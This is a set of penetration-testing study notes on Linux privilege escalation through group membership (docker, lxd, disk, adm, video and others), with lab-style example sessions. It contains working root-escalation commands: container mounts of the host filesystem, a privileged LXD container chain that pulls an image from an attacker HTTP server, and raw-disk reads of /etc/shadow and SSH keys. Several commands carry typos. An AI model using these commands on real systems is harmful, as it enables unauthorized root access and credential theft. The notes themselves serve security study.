---
created: 26-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Privilege escalation through group membership

Membership in certain privileged groups grants access to sensitive system resources that can be exploited for privilege escalation. This can be `docker` to build containers and talk to the Docker socket, `disk` for raw disk backups, or `adm` for access to protected logs. 

Commonly exploited groups:

- `sudo`/`wheel`
- `docker`
- `lxc`/`lxd`
- `disk`
- `adm`/`systemd-journal`
- `video`
- `input`

Rare but still relevant:
- `audio`
- `netdev`/`network`

>[!warning] Not all groups provide a privilege escalation path directly. Some only expose sensitive data, which might come useful in subsequent attacks.
## Enumeration

- Check group memberships of your current user:

```bash
id
```

```bash
group
```

- Check group membership for other users on the system (to see if lateral privilege escalation makes sense):

```bash
cat /etc/group
```

```bash
genent group
```

## `sudo`/`wheel`

On most distributions, membership in `sudo` or `wheel` grants permission to use the `sudo` command.

>The **`sudo` or `wheel` groups** (depending on the distribution) grant member users permissions to execute commands as another users (typically root) using `sudo`.
>
>- `wheel` is the traditional group name on BSD and some older Linux systems (RHEL, CentOS, Arch, etc.).
>- `sudo` is standard on Debian-based distributions (Debian, Ubuntu, Mint, etc.).

- List commands you are allowed to run with `sudo`:

```bash
sudo -l
```

- Check for:
	- `NOPASSWD` (commands you can run without password of your current user)
	- Wildcards
	- Specific binaries

- If you can run only specific commands as root, check [`GTFOBins`](https://gtfobins.github.io/) if you can exploit them to escalate privileges. 

>[!example]+ `sudo` with [`tar`](https://gtfobins.github.io/gtfobins/tar/) 
> ```bash
> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
> ```
## `docker`

>The **`docker` group** grants members permissions to interact with the Docker daemon without using `sudo`.

Privilege escalation is possible because **the Docker daemon, `dockerd`, runs as root**.

>[!tip]+
>- Check if Docker is running:
>```bash
>systemctl status docker
>```

- As a member of the `docker` group, you can create a **privileged container** (a container that runs as root on the system) and mount a **host filesystem** inside that container to get root access to it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

>[!note]+ Breaking this down
> - `-v /:/mnt` — Mounts the **entire host root filesystem** at `/mnt` inside the container.
> - `--rm` — Automatically removes the container after exit.
> - `-it` — Creates an interactive terminal session inside the container: `-i` keeps the container's `stdin` open and `-t` allocates a pseudo-terminal device (`-t`).
> - `alpine` — Lightweight base image (usually available).
> - `chroot /mnt sh` — Changes root ([`chroot`](https://wiki.archlinux.org/title/Chroot)) to the mounted host filesystem and spawns a shell.
> 
> As a root inside the container, you have full access to the entire host filesystem, including read-write access to `/etc/passwd` and `/etc/shadow`.
> See [[insecure_file_permissions#Writable `/etc/passwd`]].

- Alternatively:

```bash
docker run --privileged -it alpine sh
```

- Inside the container, mount the root disk manually:

```bash
fidsk -l # list host disks
mkfir /mnt
mount /dev/sda1 /mnt
chroot /mnt sh
```

>[!note] See [[insecure_file_permissions]].

Useful Docker commands:

- List available Docker images:

```bash
docker image ls
```

- Pull a Docker image from a registry without running in (`docker run` of an image you don't have automatically pulls it):

```bash
docker pull alpine:latest
```

- Convert a Docker image to a tarball:

```bash
docker save -o alpine.tar alpine:latest
```

The above command can be useful if Internet access on your target machine is limited and you can't pull an image directly from DockerHub.
Instead, you can download the image to your attacker machine (`docker pull`), convert it to a tarball, and then transfer to the target system (see [[Linux_file_transfers]] to learn how to do that).

>[!example]+
> 1. Check group membership:
> 
> ```bash
> id
> ```
> ```bash
> uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
> ```
> 
> 2. List available Docker images:
> 
> ```bash
> docker image ls
> ```
> 
> ```bash
> REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
> ubuntu       latest    5a81c4b8502e   1 year ago   77.8MB
> ```
> 
> 3. Start a privileged container and mount the host filesystem:
> 
> ```bash
> docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
> ```
> ```bash
> # whoami
> root
> ```
> ```bash
> cat /root/flag.txt
> ```
## `lxc`/`lxd`

LXD (pronounced "lex-dee") is Canonical's container hypervisor, similar to Docker but designed for system containers rather than application containers.

>The **`lxd` and `lxc` groups** grant members permissions to interact with the LXD daemon to create and manage Linux containers.

Like Docker, **the LXD daemon runs as root**.

>[!tip]+
> - Check if LXD is installed:
> 
> ```bash
> which lxc lxd
> ```
> ```bash
> lxc --version
> ```
> - Check if LXD daemon is running: 
> ```bash
> systemctl status lxd
> ```


With membership in the `lxd` group, similar to `docker`, you can create a privileged container and mount the host filesystem inside of it to escalate privileges:

1. Initialize LXD (if it hasn't been used on the system before):

```bash
lxd init
```

>[!interesting]+ `lxd init` 
>- `lxd init` is an interactive wizard that configures the LXD environment. 
>- You can specify storage backend (e.g., `dir`, `btrfs`, `zfs`, etc.), networking, and auto-update settings. For the exploit, accept the defaults.
>- This creates a storage pool named `default` using the `dir` backend and a network bridge named `lxbr0` for container networking.

>[!warning] You need an interactive shell for the `lxd init` wizard. See [[shell_upgrade]]. 

2. On your **attacker machine**, build an Alpine container image using [`lxd-alpine-builder`](https://github.com/saghul/lxd-alpine-builder):

```bash
git clone https://github.com/saghul/lxd-alpine-builder && \
cd lxd-alpine-builder
```

```bash
sudo bash ./build-alpine -a x86_64
```

>[!note]+ **Why Alpine?** It's tiny (~3MB), build quickly, and contains everything needed for exploitation.

>[!interesting]+ `build-alpine`
> - The `-a` flag specifies the architecture **of the target system**, such as `x86_64` (standard 64-bit Intel/AMD), `i686` (32-bit x86), `aarch64` (ARM 64-bit, like Raspberry Pi 4, AWS Graviton, etc.).
>- This command creates a `tar.gz` file in the current directory, like `alpine-v3.18-x86_64.tar.gz` — a complete Alpine container image.

3. Transfer the image to the target:

```bash
# on your attacker machine
python3 -m http.server 8080
```

```bash
# on the target machine
wget http://<attacker_ip_address>:8080/alpine-v3.18-x86_64.tar.gz
```

>[!note] See [[Linux_file_transfers]] for other file transfer techniques.

4. On the target machine, import the `tar.gz` image file into the LXD image store:

```bash
lxc image import ./alpine-v3.18-x86_64.tar.gz --alias alpineimage
```

>[!tip]+
>- Verify import:
>```bash
>lxc image list
>```

5. Create a privileged container instance using the imported image:

```bash
lxc init alpineimage alpinecontainer -c security.privileged=true
```

>[!interesting]+ `lxc init`
>By default, LXD uses **user namespaces** to isolate container root (UID `0` in container) from host root (UID `0` on host) by mapping it to an unprivileged UID like `10000`. `-c security.privileged=true` **disables this isolation**, which means root in the container is literally root on the host.

6. Mount the host filesystem into the container:

```bash
lxc config device add alpinecontainer rootdevice disk source=/ path=/mnt/root recursive=true
```

> [!note]+ `lxc config`
> - `lxc config device add` — Attaches a device to the container.
> - `alpinecontainer` — Container name.
> - `rootdevice` — Arbitrary device name (can be anything).
> - `disk` — Device type.
> - `source=/` — Host filesystem path to mount.
> - `path=/mnt/root` — Mount point inside the container.
> - `recursive=true` — Mount all subdirectories recursively (not just top-level ones).

7. Start the container:

```bash
lxc start alpinecontainer
```

8. Execute a shell inside the container to interact with it:

```bash
lxc exec alpinecontainer /bin/sh
```

You now have a running container `alpinecontainer` where:
- The root user inside the container is the same as the root user on the host.
- The host's entire root filesystem is available, read-write, at `/mnt/root` inside the container.
To establish persistence, you can, for example, create a new user by writing to `/etc/passwd` (see [[insecure_file_permissions#Writable `/etc/passwd`]]).

>[!note] For persistence techniques, refer to [[_persistence_techniques]].

>[!example]+ 
> - Understand which groups your current user belongs to:
> 
> ```bash
> id
> ```
> ```bash
> uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
> ```
> 
> - Find `lxc`:
> 
> ```bash
> which lxc
> ```
> ```bash
> /usr/bin/lxc
> ```
> 
> - Initialize `lxd`:
> 
> ```bash
> lxd init
> ```
> ```bash
> Would you like to use LXD clustering? (yes/no) [default=no]: 
> Do you want to configure a new storage pool? (yes/no) [default=yes]: 
> Name of the new storage pool [default=default]: 
> Name of the storage backend to use (btrfs, ceph, dir, lvm) [default=btrfs]: 
> Create a new BTRFS pool? (yes/no) [default=yes]: 
> Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
> Size in GiB of the new loop device (1GiB minimum) [default=5GiB]: 
> Would you like to connect to a MAAS server? (yes/no) [default=no]: 
> Would you like to create a new local network bridge? (yes/no) [default=yes]: 
> What should the new bridge be called? [default=lxdbr0]: 
> What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
> Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
> Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: 
> Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
> ```
> 
> - On your attacker machine:
> 
> ```bash
> git clone https://github.com/saghul/lxd-alpine-builder && \
> cd lxd-alpine-builder && \
> sudo bash ./build-alpine -a x86_64 && \
> python3 -m http.server 8080
> ```
> 
> - Fetch the `tar.gz` file from the target:
> 
> ```bash
> wget http://10.10.14.64:8080/alpine-v3.23-x86_64-20251225_0904.tar.gz
> ```
> 
> - Import the image:
> 
> ```bash
> lxc image import ./alpine-v3.23-x86_64-20251225_0904.tar.gz --alias alpineimage
> ```
> 
> - Create a new container instance from the imported image:
> 
> ```bash
> lxc init alpineimage alpinecontainer -c security.privileged=true
> ```
> ```bash
> Creating alpinecontainer
> ```
> 
> - Attach a the host's filesystem to the container:
> 
> ```
> lxc config device add alpinecontainer rootdevice disk source=/ path=/mnt/root recursive=true
> ```
> ```bash
> Device rootdevice added to alpinecontainer
> ```
> 
> - Start the container:
> 
> ```bash
> lxc start alpinecontainer
> ```
> 
> - Execute a shell inside the container to interact with it:
> 
> ```bash
> lxc exec alpinecontainer /bin/sh
> ```
> 
> ```bash
> ~ # whoami
> root
> ```
>
## `disk`

>The **`disk` group** grants member users permissions to manage storage devices, such as mounting/unmounting disks. Among others, `disk` gives **full raw read/write** access to block devices like `/dev/sda1`, `/dev/nvme0n1p2`, etc., bypassing normal file permission checks.

Normally, when you try to access a file (e.g., `cat /etc/shadow`), the kernel enforces permissions based on your UID/GID and the file's permission bits. But accessing block devices directly happens beneath the filesystem layer. And `disk` grants this ability.

`disk` **bypasses all file-level permissions** and operates on the block device level. This means you can read and write any files on the disk.

- List block devices:

```bash
lsblk
```

```bash
ls -l /dev | grep "sd\|nvme"
```

- Identify which partition contains the root filesystem:

```bash
mount | grep "on / "
```

As a member of the `disk` group, you can use `debugfs` or `dd` tool to interact with the device directly.

### Using `debugfs` (for ext2/ext3/ext4 filesystems):

- Open an interactive `debugfs` shell for a device with an ext-based filesystem mounted:

```bash
debugfs /dev/sda1
```

- Inside the `debugfs` shell, **you can read or modify any file regarding of the permissions of the current user**:

```bash
debugfs:  cat /root/.ssh/id_rsa
```

```bash
debugfs: cat /etc/shadow
```

- To list the commands you can run, type `?`. 

### Using `dd` (universal method)

- Dump the whole disk:

```bash
dd if=/dev/sda of=disk_image.img   
```

```bash
strings /tmp/disk_image.img | grep "root:"
```

- Quick and dirty way to search for strings:

```bash
dd if=/dev/sda1 | strings | grep "root:"
```

- Copy a specific file:

```bash
dd if=/etc/shadow of=dump.txt
```

## `adm` & `systemd-journal`

>The **`adm` group** is commonly used to give users read access to protected logs; it has fill read access to journal files.

>The **`systemd-journal` group** is often used to provide read-only access to the system logs, as an alternative to `adm` and `wheel`.

>[!warning] `adm` and `systemd-journal` do not provide a direct privilege escalation path. It's a path to **data exposure**.

Application or system logs can contain sensitive information, such as plaintext passwords (e.g., from failed authentication attempts), API keys and tokens, database credentials, or information about errors and misconfigurations that can be used for further attacks.

>[!note] Without these groups, a regular user can only see their own log entries. With membership in `adm` or `systemd-journal`, you can *usually* read **everything** (some logs might still require root).

- Search for secrets:

```bash
grep -Ri "password" /var/log
```

- Show logs for a specific service (e.g., a web server):

```bash
journalctl -u nginx.service -u apache2.service
```

- Show logs from the current boot:

```bash
journalctl -b
```

- Search logs for specific keywords:

```bash
journalctl -k | grep "failure"
```

```bash
journalctl | grep "passowrd"
```

>[!note] Old credentials might be in `.gz` archives. Check `/var/log/*.gz` and use `zgrep`.

## `shadow`

>The **`shadow` group** grants member users permissions to read the `/etc/shadow` and `/etc/gshadow` files.

>[!note] The `shadow` group is less common on modern distributions but still exists on some systems, particularly older ones.

With read access to `/etc/shadow`, you might be able to crack password hashes stored inside.

>[!note] See [[insecure_file_permissions#Readable `/etc/shadow`]].

## `video`

>The **`video` group** grants users access to video hardware devices like the framebuffer (`/dev/fb0`).

>[!warning] `video` does not provide a direct privilege escalation path. It's a path to **data exposure**.

Membership in the `video` group gives **read/write access to video-related device nodes**:
- `/dev/fb*` — framebuffer devices.
- `/dev/dri/card*` — [DRM](https://en.wikipedia.org/wiki/Direct_Rendering_Manager) display devices.
- `/dev/dri/renderD*` — GPU rendering interfaces.
- `/dev/video*` — [V4L2](https://en.wikipedia.org/wiki/Video4Linux) devices (webcams, capture cards),

```bash
find / -group video -ls 2>/dev/null
```

```bash
crw-rw----      root    video   /dev/media0  
crw-rw----      root    video   /dev/video1
crw-rw----      root    video   /dev/video0  
crw-rw----      root    video   /dev/fb0  
crw-rw----      root    video   /dev/dri/card1
```

- The [framebuffer](https://en.wikipedia.org/wiki/Framebuffer) is a portion of RAM that contains a bitmap that drives a video display. In other works, the framebuffer represents what's currently being displayed on the screen.
- If an administrator is working on the machine's physical console, you can potentially capture their screen via `/dev/fb*`, which might reveal sensitive information, including passwords they're typing. 
- However, this mainly works on older systems.

- With the access to V4L2 devices, via `/dev/video*`, **you may be able to capture webcam input, take photos or record video if a camera exists**. 

## `input`

>The **`input` group** grants access to input devices like keyboards and mice.

```bash
find / -group input -ls 2>/dev/null
```

```bash
crw-rw----      root    /dev/input/event14  
crw-rw----      root    /dev/input/event13  
crw-rw----      root    /dev/input/event12  
crw-rw----      root    /dev/input/event11  
crw-rw----      root    /dev/input/event10  
crw-rw----      root    /dev/input/event9  
crw-rw----      root    /dev/input/mouse2  
crw-rw----      root    /dev/input/event8  
crw-rw----      root    /dev/input/mouse1  
crw-rw----      root    /dev/input/event7  
crw-rw----      root    /dev/input/event6  
crw-rw----      root    /dev/input/mouse0  
crw-rw----      root    /dev/input/mice  
crw-rw----      root    /dev/input/event5  
crw-rw----      root    /dev/input/event4  
crw-rw----      root    /dev/input/event3  
crw-rw----      root    /dev/input/event2  
crw-rw----      root    /dev/input/event1  
crw-rw----      root    /dev/input/event0
```
## References and further reading

- [`Users and groups — Arch Wiki`](https://wiki.archlinux.org/title/Users_and_groups)
- [`SystemGroups — Debian Wiki`](https://wiki.debian.org/SystemGroups)

- [`Linux Privilege Escalation – Exploiting User Groups — stefan-security.com`](https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/#LXC/LXD)

- [`Linux Containers — Arch Wiki`](https://wiki.archlinux.org/title/Linux_Containers)
- [`LXD — Arch Wiki`](https://wiki.archlinux.org/title/LXD)
- [`LXD Container – Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/lxd-container)
- [`How to Set Up and Use LXD on Ubuntu 16.04 — DigitalOcean`](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)
- [`Lxd Privilege Escalation — Hacking Articles`](https://www.hackingarticles.in/lxd-privilege-escalation/)

- [`Docker Privilege Escalation — Hacking Articles`](https://www.hackingarticles.in/docker-privilege-escalation/)
- [`Disk Group Privilege Escalation — Hacking Articles`](https://www.hackingarticles.in/disk-group-privilege-escalation/)


- [`The Complete Guide to the dd Command in Linux — sysxplore, kubesimplify`](https://blog.kubesimplify.com/the-complete-guide-to-the-dd-command-in-linux)
- [`Framebuffer — Wikipedia`](https://en.wikipedia.org/wiki/Framebuffer)